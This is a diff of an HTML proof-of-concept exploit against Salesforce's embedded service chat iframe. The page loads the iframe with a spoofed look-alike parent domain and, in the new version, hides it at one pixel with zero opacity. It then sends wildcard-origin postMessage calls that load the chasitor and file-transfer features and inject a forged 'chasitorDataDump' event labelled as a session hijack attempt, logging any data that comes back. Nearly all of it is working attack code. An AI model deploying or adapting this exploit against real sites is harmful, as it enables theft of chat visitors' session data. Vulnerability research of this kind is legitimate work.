@@ -1,58 +1,61 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Salesforce Chasitor PoC</title>
   <meta charset="UTF-8">
+  <title>Salesforce iframe data leak PoC</title>
+  <style>
+    body { font-family: sans-serif; background: #111; color: #0f0; padding: 1em; }
+    iframe { width: 1px; height: 1px; opacity: 0; position: absolute; }
+  </style>
+</head>
+<body>
+  <h2>✅ Waiting for iframe to respond...</h2>
+
+  <iframe id="eswFrame"
+    src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz"
+    allow="camera *; microphone *;"></iframe>
+
   <script>
-    let once = false;
+    const iframe = document.getElementById("eswFrame");
+    let featuresLoaded = false;
 
-    window.addEventListener("message", function (e) {
+    window.addEventListener("message", (e) => {
       const data = e.data;
-      if (typeof data !== "object" || !data.method) return;
+      if (!data || typeof data !== "object") return;
 
+      // Log every message
       console.log("📩 Message from iframe:", data);
 
-      // Only log once
-      if (!once && data.method === "liveagent.event") {
-        once = true;
-        console.log("📦 Chasitor Data Leaked:", data.data?.chasitorData || "(none)");
+      // Step 1: iframe has initialized
+      if (data.method === "session.onLoad" && !featuresLoaded) {
+        console.log("[+] Iframe loaded (Salesforce 4.0)");
+        featuresLoaded = true;
+
+        // Load required features
+        ["chasitor", "filetransfer"].forEach(feature => {
+          console.log(`📤 Sending script.load for feature: '${feature}'`);
+          iframe.contentWindow.postMessage({ method: "script.load", feature }, "*");
+        });
+
+        // Delay sending the fake message
+        setTimeout(() => {
+          console.log("📤 Sending fake liveagent.event to iframe");
+          iframe.contentWindow.postMessage({
+            method: "liveagent.event",
+            data: {
+              event: "chasitorDataDump",
+              params: { key: "POC", value: "Session hijack attempt" }
+            }
+          }, "*");
+        }, 2000);
+      }
+
+      // Step 2: Response from Salesforce
+      if (data.method === "liveagent.event") {
+        console.log("📩 Received internal event response:");
+        console.log(JSON.stringify(data, null, 2));
       }
     });
-
-    function runPoC() {
-      const frame = document.getElementById("eswFrame");
-
-      // 1. Load features
-      frame.contentWindow.postMessage({ method: "script.load", feature: "chasitor" }, "*");
-      frame.contentWindow.postMessage({ method: "script.load", feature: "filetransfer" }, "*");
-
-      // 2. Send fake internal event to trigger info reflection
-      setTimeout(() => {
-        console.log("📤 Sending fake event to trigger session info leak");
-
-        frame.contentWindow.postMessage({
-          method: 'liveagent.event',
-          data: {
-            event: 'chasitorDataDump',
-            params: {
-              key: 'POC',
-              value: 'Test leak attempt'
-            }
-          }
-        }, '*');
-      }, 2000); // allow 2 sec for scripts to load
-    }
   </script>
-</head>
-<body onload="runPoC()">
-  <h2>Salesforce Chasitor Session Leak PoC</h2>
-  <iframe
-    id="eswFrame"
-    src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz"
-    width="500"
-    height="400"
-    style="border:1px solid black"
-    allow="camera *; microphone *;"
-  ></iframe>
 </body>
 </html>
